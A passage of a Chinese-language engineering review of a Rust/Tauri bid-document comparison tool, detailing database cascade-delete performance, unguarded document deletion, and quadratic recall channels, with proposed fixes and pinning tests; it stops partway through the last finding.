评标真实场景：一次导入 10 份投标人标书，每份约 200 页(扫描件 OCR 后 4000~6000 chunk)，跑一轮交叉比对，产出数千条条款组、cluster_members 约 2~3 万行。评审发现其中 1 份是废标/重复上传，点"删除该文档"(remove_document)：该文档 ~5000 个 chunk 逐一级联，每个触发一次 cluster_members 全表扫(2~3 万行)→约 5000×25000=1.25 亿次比较，实测量级即 12 秒起、更大工作区可达数十秒。删除期间该 WAL 写锁被独占，此时若另一后台任务在写(如另一导入 job 更新 progress、保存批注、mark_failed)，等锁超过 busy_timeout=5000ms 即抛 SQLITE_BUSY 报错。删整个工作区(delete_workspace)同样命中，且 document_id 那条 CASCADE 再叠一遍扫描。

**影响面**

受影响：所有做过"导入→比对"后再删文档/删工作区的用户，即产品核心主路径(交叉查重)之后的常规清理动作。严重度：单次删除卡 UI 数十秒到分钟(delete_workspace/remove_document 是同步 tauri command，前端 await 期间无响应)，并独占 WAL 写锁——WAL 下读不受阻(其他连接读旧快照 OK)，但任何并发写(新导入 job 的 progress/status 更新、保存批注、失败标记)会等锁，超 5000ms busy_timeout 即 SQLITE_BUSY 失败。默认配置命中：foreign_keys=ON(mod.rs:22)恒开、生产用磁盘库、池 8 连接允许并发写，均为默认，无需特殊开关即触发。频率：数据量越大越明显；小工作区(几百 chunk/几百 member)亚秒无感，故不易在开发期暴露，但真实评标(10 份大标书)几乎必现。数据正确性无损——只是慢+可能阻塞并发写。

**修复设计**（尚未落地）

新增迁移 V10，为两个 ON DELETE CASCADE 外键列各建单列索引。具体改动 src-tauri/src/db/migrations.rs：
1) 常量表追加(当前 MIGRATIONS 数组 :6-16)：在 DROP_UNUSED_EDGE_INDEXES_V9 后加一行 `INDEX_CLUSTER_MEMBERS_FK_V10,`。
2) 新增常量(接在 V9 常量 :303-305 之后)：
```
// V10：为 cluster_members 两个 ON DELETE CASCADE 外键补级联查找索引。
// PK=(cluster_id,document_id,chunk_id)，chunk_id/document_id 非最左前缀，删文档/工作区时
// 每个被删 chunk 触发一次 cluster_members 全表扫，O(chunks×members)。与 V9 保留
// idx_edges_source/target 同理(candidate_edges 已修，此表当时漏网)。
const INDEX_CLUSTER_MEMBERS_FK_V10: &str = "
CREATE INDEX idx_cluster_members_chunk ON cluster_members(chunk_id);
CREATE INDEX idx_cluster_members_document ON cluster_members(document_id);
";
```
run() 逻辑(:18-34)按 MIGRATIONS.len() 泛化处理版本推进与"更新版本创建的库"拒绝，无需改动；追加后 target 自动=10。
副作用/注意：(a) 已发布迁移只增不改(文件头注释 :1-2 的铁律)，必须新增 V10 而非改 V1 建表——正确。(b) 老库(user_version=9)启动时自动补跑 V10，在既有 cluster_members 上建索引，一次性 CREATE INDEX 对大表有短暂开销但仅一次。(c) 两个索引各占少量磁盘、每次 INSERT cluster_members(compare_repo.rs:82-85 insert_clusters 批量写)多维护两棵 B-tree——写入侧代价极小、可接受，收益远超。(d) V9 注释(:299-302)已论证同规则，建议此次同步在 V10 注释里点名"此表当时漏网"以免再被误删。(e) delete_job_results(compare_repo.rs:128-132)走 clusters→cluster_members 的 cluster_id(PK 最左，已 SEARCH)不受本问题影响，无需改。【本次复核未修改任何文件】。

**钉死测试**

测试名：cluster_members_cascade_fk_uses_index，放 src-tauri/src/db/migrations.rs 的 #[cfg(test)] mod tests 内(与既有 migrates_fresh_db_and_is_idempotent 同处，已有 Connection::open_in_memory 样式)。做法(用 EXPLAIN QUERY PLAN 断言用索引，不依赖计时故 CI 稳定)：
```
#[test]
fn cluster_members_cascade_fk_uses_index() {
    let mut conn = Connection::open_in_memory().unwrap();
    run(&mut conn).unwrap();
    for (col, sql) in [
        ("chunk_id",    "EXPLAIN QUERY PLAN DELETE FROM cluster_members WHERE chunk_id = 'x'"),
        ("document_id", "EXPLAIN QUERY PLAN DELETE FROM cluster_members WHERE document_id = 'x'"),
    ] {
        let plan: String = conn.query_row(sql, [], |r| r.get(3)).unwrap();
        assert!(plan.contains("USING INDEX"),
            "cluster_members 按 {col} 的级联删除应走索引，实际计划: {plan}");
        assert!(!plan.contains("SCAN cluster_members"),
            "不应全表扫 cluster_members({col}): {plan}");
    }
}
```
旧代码(无 V10)：两列均 `SCAN cluster_members` → 断言失败。加 V10 后：`SEARCH cluster_members USING INDEX idx_cluster_members_chunk/document (…=?)` → 通过。(EXPLAIN QUERY PLAN 第 4 列 detail 即计划文本，rusqlite r.get(3) 取之，已用 sqlite3 CLI 核对确切输出串。)

**对原发现的修正**

机制、位置、严重级(STRUCT)、O(chunks×members)、7fe84a8/V9 论证背景均核实属实，无实质错误，仅两处精确化：(1) 位置行号精确为 migrations.rs:173-180(与原发现一致，无偏移)。(2) 锁语义微调：库为 WAL 模式(mod.rs:21) + r2d2 池 8 连接 + busy_timeout=5000ms，长删除独占的是 WAL 单写锁——阻塞的是并发"写"操作(超 5s 抛 SQLITE_BUSY)，并发"读"走旧快照不受阻；原文"持写锁令他连接超时"方向正确，严格说仅令并发写连接超时。(3) 触发最坏路径澄清：删文档(remove_document)比删工作区更能稳定命中最坏 O(N×M)，因删文档不删 clusters/members，级联期间 members 全程满员；删工作区若 clusters 先被级联清掉可能部分缩小 members，最坏情形取决于级联顺序。实测 8000 chunks×30000 members≈12s，支持"数十秒到分钟"在更大工作区成立。整体确认，非设计取舍(与 V9 保留 idx_edges_source/target 同规则，此表确为漏网)。

---

### S8 · remove_document 无守卫也不失效既有比对结果，级联制造空壳条款并可令运行中比对以晦涩 FK 错误失败

**级别** 🟠 STRUCT · **工作量** M

**位置**
- `src-tauri/src/commands/document.rs:73-76 (remove_document command)`
- `src-tauri/src/db/repo/document_repo.rs:192-198 (document_repo::remove，裸 DELETE)`
- `src-tauri/src/db/migrations.rs:173-180 (cluster_members 三列 ON DELETE CASCADE)`
- `src-tauri/src/db/migrations.rs:182-192 (diffs.base/target_chunk_id 无 REFERENCES)`
- `src-tauri/src/db/mod.rs:22 (PRAGMA foreign_keys=ON，级联/FK 冲突为真)`
- `src-tauri/src/db/repo/compare_repo.rs:189-256 (count_clusters/list_clusters 无 member_count 过滤)`
- `src-tauri/src/db/repo/compare_repo.rs:342-349 & 412-425 (get_cluster_detail/export_rows INNER JOIN 静默丢空壳)`
- `src-tauri/src/services/compare_service.rs:114-132 (载文档) 与 259-274 (写事务 insert_edges/insert_clusters) 的 FK 冲突窗口`
- `src-tauri/src/services/compare_service.rs:351-355 (matrix_json 快照 documentIds)`
- `src-tauri/src/db/repo/job_repo.rs:92-100 (has_active 仅管同类型互斥，与删文档无关)`
- `src/screens/CompareSetup.tsx:513-532 (裸 ✕ 一键删除，无二次确认)`

**机制（逐环调用链）**

逐环调用链，每环已按当前代码核对属实：
1) 触发点 前端 src/screens/CompareSetup.tsx:513-532：文档卡片右上角一个裸『✕』span，onClick 直接 onRemove()→removeDoc.mutate(d.id)（第 277-281 行），无 Popconfirm/window.confirm/Modal 任何二次确认。
2) src/queries/data.ts:240-246 useRemoveDocument→api.removeDocument→src/api/index.ts:44-45 invoke('remove_document',{documentId})。
3) src-tauri/src/commands/document.rs:73-76 remove_document 直接调用 document_repo::remove(&*conn, &document_id)，无任何前置检查：不查该文档是否被现存 compare 结果引用、不查是否有运行中/pending 任务。
4) src-tauri/src/db/repo/document_repo.rs:192-198 remove 执行『DELETE FROM documents WHERE id=?1』，唯一保护是 n==0 时报 NotFound；成功删除后立即 Ok(())。
5) src-tauri/src/db/mod.rs:19-24 init_conn 内 PRAGMA foreign_keys=ON——级联与 FK 约束真实生效（非仅 schema 声明）。删 documents 行触发 SCHEMA_V1 中所有 ON DELETE CASCADE：migrations.rs:70-72 chunks.document_id、94-95 chunk_features、137-153 candidate_edges.source/target_chunk_id、173-180 cluster_members(document_id+chunk_id)、182-192 diffs 经 chunks/clusters 间接、194-210 facts 经 chunks。
6) 结果 A（空壳条款）：一个雷同条款组 cluster 通常含 2+ 文档成员。删其中一份 → cluster_members 里属于该 doc 的行级联消失，clusters 行本身（外键到 jobs，非 documents）保留 → 变成 1 成员甚至 0 成员空壳。
7) 结果 A 暴露面：compare_repo.rs:189-202 count_clusters『SELECT COUNT(*) FROM clusters WHERE job_id=?1』与 204-256 list_clusters 均无 member_count>0/HAVING 过滤，子查询 (SELECT COUNT(*) FROM cluster_members ...) 只作为返回列 member_count，不作过滤条件 → 空壳仍进结果列表，document_ids 变空、member_count=0。而 get_cluster_detail(342-349) 与 export_rows(412-425) 用 INNER JOIN cluster_members → 空壳在详情页/导出举证报告里静默消失。同一条款在『列表计数』和『详情/导出』之间自相矛盾。
8) 结果 B（悬挂引用）：diffs.base_chunk_id/target_chunk_id 在 migrations.rs:184-185 是纯 TEXT 无 REFERENCES（故不触发 FK 报错，但成为指向已删 chunk 的孤儿字符串）；facts 经 chunk 级联被删。
9) 结果 C（快照失真）：compare_service.rs:351-355 matrix_json 显式存 'documentIds': cfg.document_ids 快照；job 完成后删文档，matrix_json/summary_json 仍含已删 doc id，export_service.rs:89/105-111 据此还原矩阵 → 导出报告含幽灵文档列。
10) 结果 D（运行中比对 FK 崩）：compare_service.rs:114-132 在 load 阶段读入 document_ids 对应文档；打分后于 259-274 单事务内 insert_edges(写 candidate_edges.source/target_chunk_id→chunks FK) 与 insert_clusters(写 cluster_members.document_id→documents FK、chunk_id→chunks FK)。remove_document 与运行中 job 之间无任何互斥（has_active 仅 job_repo.rs:92-100 拦同 workspace 同 job_type 的 pending/running/cancelling 任务，跟删文档正交）。若在 load 与 write 之间删掉参与比对的文档，级联抹掉其 chunks，写事务的 FK insert 失败 → tx 回滚 → run_inner 返回 Err → run_compare(96-102) 清结果，整个比对以底层 SQLite『FOREIGN KEY constraint failed』式晦涩错误终态 failed。

**最小复现**

场景一（空壳+举证矛盾，最常见）：某评标室导入 3 份同标段投标人标书（如各约 25 页），跑一次交叉比对，得到 A×B 的『售后承诺』雷同条款组等结果并已人工标注。评审员随后发现 C 份误传，点文档卡片右上『✕』一键删除（无确认弹窗）。C 参与的所有雷同/围标条款组里 C 的成员行级联消失：原 A/B/C 三方雷同组变成 A/B 两方（尚可），但 A/C 或 B/C 的两方组直接坍成单成员空壳。回到结果列表：条款总数/各类计数仍把空壳算进去（count_clusters 无过滤），点进详情却空空如也（INNER JOIN 丢空壳），导出的举证报告里这些条款整条蒸发——『列表说有 12 条雷同，报告里只有 9 条』，可举证性直接崩。
场景二（运行中崩）：导入 4 份标书发起比对（几十秒~分钟级，扫描件 OCR 更久），比对进行中评审员在另一处文档列表点删其中一份 → 载文档后、写结果前的窗口命中 → 任务以看不懂的 FK 约束错误 failed，用户只见『比对失败』无从排查。

**影响面**

影响面：所有做过至少一次比对、之后又删过参与文档的工作区，即产品核心流程本身（导入→比对→复核→删误传件→再导出）。严重度 STRUCT：直接损伤产品第一价值主张『输出可举证报告』——列表计数与详情/导出不一致、导出含幽灵文档列，法务/纪检举证场景下这是硬伤（数字对不上会被质疑报告可信度）。默认配置命中：FK 强制默认开（mod.rs:22 无条件），删除按钮默认存在且无确认，无需任何特殊开关。发生频率：中高——『删误传/重复上传的标书』是评标日常操作，且 UI 是一键无确认，误触门槛极低；运行中删除致 job 崩为低频但存在的竞态。数据不会静默损坏到不可读（无脏读崩溃），但结果语义失真且不可逆（删除无法撤销，原比对结果已被级联改写）。

**修复设计**（尚未落地）

分两层设防，均在 remove_document 路径加前置守卫，不动级联语义：
(1) 运行中任务拒删（挡 FK 崩，效果 D）：在 remove_document 里删前查该文档所属 workspace 是否有 pending/running/cancelling 的 compare 任务，有则拒。可复用现成能力——document_repo 已能拿到 workspace_id，job_repo::has_active(conn, &doc.workspace_id, "compare") 即可判定；命中则返回 AppError::new(AppErrorCode::JobConflict, "该工作区有比对任务正在运行，请等待完成或先取消再删除文档")。伪代码（document.rs remove_document 内）：
  let c = conn(&state)?;
  let doc = document_repo::get(&c, &document_id)?;
  if job_repo::has_active(&c, &doc.workspace_id, "compare")? { return Err(JobConflict...); }
  document_repo::remove(&c, &document_id)
注意 has_active 目前按 (workspace_id, job_type) 粒度，比『仅该文档参与的任务』更保守（会拦同工作区任意 compare），但对『宁转人工不误告/不误删』的价值观是安全侧，可接受；如需精确到文档，另加一条按 config_json 里 documentIds 匹配的查询。
(2) 被既有结果引用时的处理（挡空壳+快照失真，效果 A/C）：两选一，建议默认『拒绝删除』并给出可操作出口：
  - 方案甲(拒删，推荐，改动小)：删前查 SELECT EXISTS(SELECT 1 FROM cluster_members WHERE document_id=?1)（新增 document_repo::is_referenced_by_results 或直接在 command 里查），命中则 Err(AppErrorCode::InvalidConfig 或新增 DocumentReferenced, "该文档已被 N 个比对结果引用，删除会使这些举证结果残缺；请先删除相关比对任务再删文档")。前端 CompareSetup.tsx onRemove 的 onError 已有 toast，会自然显示该提示；并建议给『✕』补一个二次确认（Popconfirm/window.confirm），因当前零确认。
  - 方案乙(级联失效结果)：若产品希望允许删，则删文档时把引用了该文档的 jobs 结果一并失效——delete_job_results(job_id) 清 clusters/edges 并清空 summary_json/matrix_json/collusion 等结果列、或把这些 job 打标记为 stale。改动更大且会连带删掉用户已复核的其他结果，副作用大，不建议默认。
需一并改/核对的地方：
  - 若走方案甲拒删，前端 CompareSetup.tsx:277-281 与 513-532 建议补二次确认，减少误触；文案层面把『移除失败』的 toast 保留即可。
  - 若新增 AppErrorCode（如 DocumentReferenced），需在 error.rs 枚举与前端 errMsg 映射补对应中文。
  - 无需新迁移号：本修复不改 schema，纯命令层守卫。
  - 兜底建议（可选，独立于上面）：list_clusters/count_clusters 加 member_count>0 的 HAVING/EXISTS 过滤，即便未来仍产生空壳，列表与详情/导出至少自洽——但这是纵深防御，不能替代前置守卫（快照 matrix_json 失真、diffs 悬挂仍在）。

**钉死测试**

文件：src-tauri/src/db/repo/document_repo.rs 新增 #[cfg(test)] mod tests（该文件当前无测试模块，与 job_repo.rs 同风格）。
测试一 remove_document_rejected_when_referenced_by_cluster：用 open_in_memory()（自带 migrations + FK on）建 ws、一份 parsed 文档 d、一个 job、一个 cluster 及一条 cluster_members(document_id=d.id)。断言修复前：直接 document_repo::remove 会连带级联删掉该 member 且返回 Ok（旧代码通过=坏）；修复后：改调带守卫的命令层逻辑（或新 document_repo::remove_guarded），断言返回 Err 且 cluster_members 行仍在（COUNT(*)==1）。关键断言：assert!(result.is_err()); assert_eq!(members_count(&conn, cluster_id), 1)。
测试二 remove_document_rejected_during_running_compare：建 ws + parsed 文档 + 一个 status='running' 的 compare job（job_repo::create 后 set_running）。断言守卫命中：remove 返回 JobConflict，文档仍存在（document_repo::get 成功）。关键断言：assert_eq!(err.code, AppErrorCode::JobConflict)。
两测试在旧代码（无守卫）必失败（旧代码会成功删除并级联），修复后通过。放同文件是因为守卫逻辑理应下沉到 repo 或至少可被 repo 级测试覆盖；若守卫留在 command 层，则测试放 src-tauri/src/commands/document.rs 的 #[cfg(test)] mod 或复用 has_active/is_referenced 的 repo 单测。

**对原发现的修正**

基本准确，两处微调：(1) 原文『diffs.base/target_chunk_id 无外键成悬挂』——核实 migrations.rs:184-185 该两列确为纯 TEXT 无 REFERENCES，故删 chunk 不触发 FK 报错，只是变成指向已删 chunk 的孤儿字符串引用；表述『无外键成悬挂』本身正确，但要点明它不参与 FK 崩（FK 崩来自 cluster_members/candidate_edges 那些真外键），二者机制不同别混。(2) 行号更新：remove_document 命令当前在 document.rs:73-76（原文 74-76 基本吻合），真正的裸 DELETE 在 document_repo::remove document_repo.rs:193。严重级 STRUCT 判定成立（损伤可举证报告一致性、且有运行中致 job 崩的竞态），不属『其实是设计』——现有唯一守卫 has_active 只解决同类任务互斥，从代码与注释看并无『允许删已比对文档』的显式设计意图。

---

### S9 · embedding 召回通道(通道5)对全体 chunk 暴力 O(n²) 全维余弦，无 ANN/分桶/通道间预筛

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** L

**位置**
- `src-tauri/src/engine/candidate.rs:147-174 (通道5 整体)`
- `src-tauri/src/engine/candidate.rs:154-163 (内层对全部 j 的 O(n) 扫描 + 全维 cosine)`
- `src-tauri/src/engine/candidate.rs:159 (embed::cosine 调用)`
- `src-tauri/src/engine/candidate.rs:165 (top-5 截断在全量扫描之后)`
- `src-tauri/src/engine/embed.rs:192-201 (cosine 每调用重算 dot + 两个 norm，无预归一)`
- `src-tauri/src/services/compare_service.rs:159-164 (enable_semantic 时产 embeddings)`
- `src-tauri/src/services/compare_service.rs:175 (recall 调用传入 embeddings)`
- `src-tauri/src/services/compare_service.rs:433-441 (embed_chunks 尾部：为每个 comparable chunk 填 Some 向量)`
- `src-tauri/src/engine/candidate.rs:2-3 (自称 '避免 O(M²)…每 chunk 候选受 top_k 约束' 的总体宣称，与通道5矛盾)`

**机制（逐环调用链）**

逐环调用链（均以当前 main@4078315 代码核实）：
1) 触发：commands/compare.rs 校验文档数在 MIN_DOCS=2..MAX_DOCS=10（config.rs:8-9），进入 compare_service。用户在配置里 enable_semantic=true（默认 false，见 config.rs:37）。
2) compare_service.rs:159-164：cfg.enable_semantic 为真 → 调 embed_chunks，对全部 comparable chunk 生成向量。
3) embed_chunks 尾部 compare_service.rs:433-441：`chunks.iter().map(|c| cache.get(&c.normalized_hash).cloned())` —— 为**每个** comparable chunk 都填入向量（按 normalized_hash 去重缓存，但映射回原 chunk 序列后，除极少数嵌入失败外，embs[i] 全为 Some(Some(_)))。因此后续 embs.get(j) 对几乎所有 j 命中。
4) compare_service.rs:175 candidate::recall(&comparable, embeddings.as_deref(), ¶ms)。
5) candidate.rs:147 `if let Some(embs) = embeddings` 进入通道5；148-151 `chunks.par_iter().enumerate()` 对每个 chunk i 起一个 rayon 任务。
6) candidate.rs:152 取 ei；154 `for (j, cj) in chunks.iter().enumerate()` —— **对全体 n 个 chunk 遍历**，无任何倒排/分桶/ANN 预筛。155 `if j <= i || cj.doc == c.doc { continue }` 只跳过 j≤i 与同文档，但**循环体本身仍是完整 O(n) 遍历**（跳过的对不算 cosine，但迭代次数不变）。
7) candidate.rs:158-159：对跨文档且 j>i 的对，调 embed::cosine(ei, ej)。embed.rs:192-201 每次做全维 dot + 两个 sqrt(平方和)，无预归一缓存 → 每对 ~3·dim FLOPs（dim：默认 bge-zh=512；bge-large-zh/e5-large=1024）。
8) candidate.rs:160-165：cos≥semantic_floor(0.78) 的入 cands，最后 sort + truncate(5) —— **截断发生在全量 O(n) 扫描之后**，无法提前剪枝。
结果：总比对次数 = Σ_i (i 之后的跨文档 chunk 数) ≈ n²/2 × (跨文档比例)，全维余弦。sentence 粒度（chunker.rs 产 'sentence' 级块）+ 10 份大标书时 n 可达数万至十万级 → 数千万至上亿次全维余弦。rayon 只做核数级并行，仍是分钟到十余分钟，且每次比对重算、不可增量。这是五通道里唯一无索引结构的通道（通道3 用倒排+MinHash、通道4 用 TF-IDF 倒排），与 candidate.rs:2-3 的总体宣称直接矛盾。

**最小复现**

评标真实场景：某标段导入 6 份技术标（每份约 80~120 页 docx，含大量条款化正文），评审员为抓'换措辞改写围标'在设置里打开'启用语义比对'并把比对粒度设为句子（sentence）。6 份 × 每份约 3000~5000 句 ≈ 2~3 万个有向量 chunk。点'开始比对'后，前四通道秒级完成，进度停在'候选召回'——通道5 需做约 (2.5万)²/2 × 跨文档比例 ≈ 上亿次 1024 维（若选 bge-large-zh）余弦，rayon 并行下仍卡数分钟到十余分钟，期间无细粒度进度、无法增量；换一份文档重来又是全量重算。更小规模也可触发：3 份 120 页、句子粒度约 1.2 万 chunk，同样是千万级余弦。默认配置（enable_semantic=false + paragraph 粒度）不触发。

**影响面**

受影响者：仅**主动开启 enable_semantic** 的评审员（默认 false，config.rs:37）。默认配置下通道5 不执行，此悬崖不命中——这是关键限定。命中条件叠加放大：enable_semantic=true 且（句子粒度 或 文档数多/篇幅大导致 paragraph 粒度 chunk 数也上万）。严重度：不产生错误结论（只影响耗时/体验），属性能与可维护性类，不违背'宁转人工不误告'价值观，故 STRUCT 而非 CRIT 合理。发生频率：语义比对是产品主打卖点之一（抓改写围标），一旦大标段+句子粒度是完全现实的用法；但因非默认，命中率中等。次生影响：通道5 是唯一 O(n²)，一旦开启即成整条流水线瓶颈，掩盖其余优化；且 architecture-analysis 已自认（docs/architecture-analysis-v0.4.md:172 S4-11、189 演进建议）为已知悬崖并规划 ANN，属'已知未修'技术债。

**修复设计**（尚未落地）

目标：把通道5 的精比范围从'全体 chunk 笛卡尔积'收敛到'其余通道已产候选并集'或'LSH 粗桶内'，与四通道索引结构对齐。**不改任何文件，仅设计**：

方案A（推荐，改动最小、无新依赖）——候选并集限定：将 recall 内前四通道产出的跨文档候选对先收集到局部集合 union_pairs（当前 push 直接写 out，可改为先写一个 Vec/HashSet），通道5 只对 union_pairs 中至少一端相关的对做补充，或反过来：通道5 仅在 union_pairs 内'补算 cosine 用于排序'而不新增对。若目标是'抓字面几乎不重合的改写'（union 里恰好没有），方案A 会漏这类——需配合方案B。

方案B（对齐文档规划，抓纯语义改写）——LSH/随机投影粗桶：为每个向量算 b 位签名（k 个随机超平面，sign(<r_t, e_i>)），按签名分桶（HashMap<u64, Vec<u32>>），通道5 只在**同桶或汉明距≤h 的邻桶**内做全维 cosine 精比 + floor 过滤 + top5。伪代码：
```
let planes = fixed_random_planes(dim, K); // 用固定 seed，保证同一 workspace 可复现/可缓存
let mut buckets: HashMap<u64, Vec<u32>> = HashMap::new();
for (i, e) in embs 中有向量者 { buckets.entry(lsh_sign(e, &planes)).or_default().push(i); }
// 精比只在桶内（或多张哈希表取并集降低漏召）
for idxs in buckets.values() { for i in idxs { for j in idxs where j>i && doc 不同 { cosine... } } }
```
用 L 张独立哈希表（amplification）降漏召，L·K 为可调超参。复杂度从 O(n²·dim) 降到 ~O(n·L·dim + Σ桶内对数·dim)。

**预归一顺带优化**（正交但便宜）：embed_chunks 写缓存时或 recall 入口把每个向量 L2 归一化一次，通道5 与精排阶段 embed::cosine 改为纯 dot（省掉每对两次 sqrt）。注意 embed.rs:192 的 cosine 还被 compare_service.rs:198 精排复用，改成'假定已归一'需同步两处或另加 dot_normalized 函数，避免破坏精排语义。

副作用与需一并改处：
- 语义是'召回'，LSH 会引入可控漏召（top5 可能漏边）；须保守设 K/L 并在 §9.3 设计文档与 candidate.rs:2-3、146 注释更新为'通道5 经 LSH 粗桶近似召回，非全量精确'。
- docs/architecture-analysis-v0.4.md:172(S4-11) 与 189(演进第三优先) 的'待办'状态应在修复后回勾。
- 随机平面须固定 seed（否则两次比对候选不稳定，破坏可举证/可复现取证要求）。
- 若走方案A/B 改变了 recall 内部 push 时机，注意不要影响前四通道现有对（现有测试 hash_and_ngram_channels_recall_similar_pairs 必须仍通过）。
- 无需 DB 迁移（不涉及表结构）。

**钉死测试**

位置：src-tauri/src/engine/candidate.rs 的 #[cfg(test)] mod tests（现有测试模块，已有 from_row/fill_tfidf 辅助）。
测试名：semantic_channel_scales_subquadratic（或 semantic_recall_bounded_comparisons）。
构造：造 N（如 2000）个跨 3 文档的 sentence 级 chunk，其中绝大多数向量互不相似（仅少数几对真语义近）。给每个 chunk 造归一化随机向量作为 embeddings: Vec<Option<Vec<f32>>>，让约 3~5 对余弦≥semantic_floor。
关键断言：
1) 正确性：recall(&chunks, Some(&embs), &p) 仍召回那几对真语义近对（assert got.contains 每对）——保证 LSH 不漏这批。
2) 复杂度插桩：在 embed::cosine（或通道5 内）加一个 #[cfg(test)] 计数器（AtomicUsize），断言 cosine 调用次数 << N²/2（如 < N*50），旧代码此计数 ≈ N²/2 会**远超**上限而失败，修复后受桶大小限制通过。
注：现有 perf_smoke_three_docs_100_pages_under_60s（compare_service.rs:1149）用 enable_semantic:false，不覆盖通道5；可另加一个开启语义的 perf smoke（句子粒度、几千 chunk、断言 <某秒），旧代码超时、修复后通过——但计数器版更稳、不受机器性能波动影响，推荐作主 pinning。

**对原发现的修正**

1) 行号：原发现写'147-174'与'151-166'基本准确；以当前代码为准，通道5 整体在 candidate.rs:147-174，真正 O(n²) 的内层扫描在 154-163，cosine 调用在 159，top5 截断在 165。
2) 原发现称'与 candidate.rs:65 "O(M²)→O(M·k)"总体宣称矛盾'——行号有误：该'避免 O(M²) 精排/每 chunk 候选受 top_k 约束'的宣称实际在文件顶部注释 candidate.rs:2-3；第 65 行是通道2 hash 桶去重循环的收尾，不含该宣称。矛盾结论本身成立，只是引用行号需修正为 2-3。
3) 触发条件补正：原发现未强调**默认配置不命中**——enable_semantic 默认 false（config.rs:37）、默认粒度 paragraph（config.rs:34）。此悬崖只在用户主动开启语义比对时出现，属'用户可选路径'而非'默认必经'，blastRadius 应据此下调命中频率（但严重级 STRUCT 仍恰当）。
4) 维度补正：默认模型是 bge-zh(bge-small,512维)，非文档举例隐含的 1024 维大模型；'高维余弦'量级正确（512~1024 维），10k chunk≈5000万对量级也对（cross-doc 过滤后略低于 n²/2）。
5) 机制补强（非纠错）：embed_chunks 尾部(compare_service.rs:433-441)确证 embs 对几乎所有 chunk 为 Some，故内层 embs.get(j) 命中率≈100%，O(n²) 是真实而非理论上界。
6) 严重级：确认 STRUCT 恰当——只影响耗时/可增量性，不产错误结论，不违背核心价值观；未虚高也未低估。整体结论成立，未推翻。

---

### S10 · TF-IDF 召回通道(通道4)倒排无 posting 长度上限，与通道3 的 stop_gram_df 保护不对称，最坏 O(Σdf²) 退化

**级别** 🟠 STRUCT · **复核状态** refined（见文末修正） · **工作量** S

**位置**
- `src-tauri/src/engine/candidate.rs:111-137 (通道4 TF-IDF 倒排+累加，无 posting 上限)`
- `src-tauri/src/engine/candidate.rs:112-117 (构建 inverted，无任何 retain 过滤)`
- `src-tauri/src/engine/candidate.rs:122-131 (每 chunk 每 token 扫全 posting 累加 dot)`
- `src-tauri/src/engine/candidate.rs:133 (0.25 过滤发生在累加之后，救不了代价)`
- `src-tauri/src/engine/candidate.rs:74 (对照：通道3 有 inverted.retain(v.len()<=stop_gram_df))`
- `src-tauri/src/services/compare_service.rs:169-174 (调用方仅把 stop_gram_df 传给通道3，未复用到通道4)`
- `src-tauri/src/engine/features.rs:195-197 (IDF=ln((n+1)/(d+1))+1，全命中词 IDF=1.0 非0——修正原发现)`

**机制（逐环调用链）**

逐环调用链（均已 Read 当前代码确认属实）：
1) compare_service.rs:156 corpus::fill_tfidf(&mut comparable) → corpus.rs:77-82 对每 chunk 调 features::weighted_vec，得到 c.tfidf: HashMap<String,f32>（键=jieba 分词去重后的词，值=L2 归一化 tf-idf）。词是词级（similarity.rs:45 tokenize_lang→jieba），无停用词过滤，故'的/项目/系统/投标人/技术/方案'等模板高频词都在向量里。
2) compare_service.rs:169-175 构造 RecallParams（stop_gram_df=(len/10).max(256)）并 candidate::recall(&comparable, …)。
3) candidate.rs:112-117 通道4 构建 inverted: HashMap<&str, Vec<(u32,f32)>>；对每 chunk 每个 (t,w) 无条件 push。因 weighted_vec 内 tf 已按词去重，token t 的 posting 长度 == 含 t 的 chunk 数 == df(t)。全命中的模板词 posting 长度 = n（chunk 总数）。**关键：此处无 inverted.retain(...)，与通道3 line74 不对称。**
4) candidate.rs:118-131 par_iter 每 chunk i：for (t,w) in c.tfidf { if let Some(post)=inverted.get(t) { for &(j,wj) in post { if j>i && 跨文档 { dot[j]+=w*wj } } } }。chunk i 的扫描代价 = Σ_{t∈chunk_i} df(t)。全语料合计 = Σ_t df(t)²。当高 df 词密集（标书语料模板化）时 df(t)≈n，退化 O(Σdf²)≈O(K·n²)（K=高频词数）。
5) candidate.rs:133 cands=dot.filter(|s|*s>=0.25)——过滤在**累加之后**，无法省掉第4步的 O(Σdf²) 内层累加代价（点积已经算完了）。
6) 结果：CPU 时间与内存中间态（每 chunk 的 dot HashMap 最坏 O(n) 键）随 n² 膨胀，大语料下 recall 阶段（compare_service.rs:168 progress"候选召回"）明显变慢/卡顿；虽有 rayon 并行(par_iter)摊到多核，但总功仍是 O(Σdf²)。

**最小复现**

评标真实场景：一次导入 8~10 份同一招标项目的投标标书（默认 chunk_level=paragraph），每份 60~120 页、含大量复制自招标文件的模板化条款（'投标人应…/本项目…/技术方案…/严格遵守…'）。这类标书交叉雷同正是本工具目标场景，故高 df 词天然密集。假设参评 chunk 总数 n≈8000~15000，模板高频词 df(t) 逼近 n。通道4 内层累加做 Σdf² ≈ 数亿~数十亿次浮点乘加 + HashMap 累加；对比通道3 因 line74 停用保护（v.len()>stop_gram_df 直接丢弃）代价被压到 O(n·stop_gram_df)。可复现表现：候选召回阶段耗时/内存随文件数与页数超线性上升；构造极端语料（如把同一段模板段落复制成 5000 个跨文档 chunk）可放大到秒级~十秒级停顿。

**影响面**

受影响：所有走 compare_service::run 的比对任务（唯一入口，通道4 无条件执行，不像通道5 embedding 需 enable_semantic）。默认配置**命中**：candidate_top_k=100、chunk_level=paragraph、无 tfidf 停用词、stop_gram_df 仅护通道3。严重度=STRUCT（合理）：非误告/正确性问题（召回结果不受影响，仍能找到雷同），是性能/可扩展性退化——正是本工具核心卖点'一次 2~10 份'的规模区间被 O(n²) 侵蚀。发生频率：随文件数×页数增长，小规模（2~3 份短标书，n<2000）几乎无感；中大规模（8~10 份长标书，模板化重）稳定触发可感知卡顿，但通常不至于 OOM/崩溃（dot 是 f32 HashMap，非囤边）。属'规模上限被压低'而非'功能不可用'。

**修复设计**（尚未落地）

与通道3 对称，给通道4 倒排加同款 posting 上限：

candidate.rs 通道4 在构建 inverted 后（现 line117 之后、118 par_iter 之前）插入一行：
```rust
// 与通道3 对称：过长 posting 属模板高频词，IDF 相对低、对召回贡献边际，停用以避免 O(Σdf²) 退化
inverted.retain(|_, v| v.len() <= p.stop_gram_df);
```
复用现有 p.stop_gram_df（compare_service.rs:172 已算好 (len/10).max(256)），无需新增参数、无需改调用方、无迁移号。

副作用/需一并处理：
